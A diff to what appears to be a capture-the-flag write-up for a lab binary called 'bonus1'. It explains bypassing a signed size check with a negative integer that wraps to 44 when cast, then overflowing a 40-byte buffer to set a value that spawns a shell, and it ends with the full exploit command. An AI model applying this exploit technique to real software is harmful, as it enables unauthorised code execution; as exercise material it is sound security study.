@@ -1,15 +1,16 @@
 # Bonus 1
 
-We have a program who take arguments:
+- We have a program who takes arguments:
 
-```sh
-$ ./bonus1 
+```console
+$ ./bonus1
 Segmentation fault (core dumped)
 $ ./bonus1 42
 $ ./bonus1 42 42
 ```
 
-By decompiling the code, we find:
+- By decompiling the code, we find:
+
 ```c
 int main(int argc, char **argv)
 {
@@ -29,17 +30,18 @@ int main(int argc, char **argv)
 }
 ```
 
-The problem is the next one: we need to set "arg" to 0x574f4c46 to start a shell, but the atoi prevent the value to be superior to 9.
+- The problem is the next one: we need to set `arg` to 0x574f4c46 to start a shell, but the `atoi` prevents the value to be superior to 9.
+- We also see a buffer of size 40. Maybe we can perform a buffer overflow but same problem: the number of bytes we can put with the `memcpy()` depends on `arg` who's still limited to 9.
+- To start, we can bypass the comparison with 9 by passing a negative value who rotates with unsigned value like: -2147483637 who will give 44 once casted.
 
-We also see a buffer of 40, maybe we can perform a buffer overflow but same problem, the number of bytes we can put with the memcpy depends on arg who's still limited to 9.
-
-To start, we can bypass the comparison with 9 by passing a negative value who rotates with unsigned value like: -2147483637 who will give 44 once casted.
-
-```sh
+```console
 $ python -c "print((-2147483637 * 4) & 0xFFFFFFFF)"
 44
 ```
-So know, we can bypass the first comparison, and define a size bigger than the buffer, we can perform our overflow!
 
+- So now, we can bypass the first comparison, and define a size bigger than the buffer.
+- We can perform our overflow!
+
+```console
 ./bonus1 -2147483637 $(python -c 'print("A" * 40 + "\x46\x4c\x4f\x57")')
-
+```
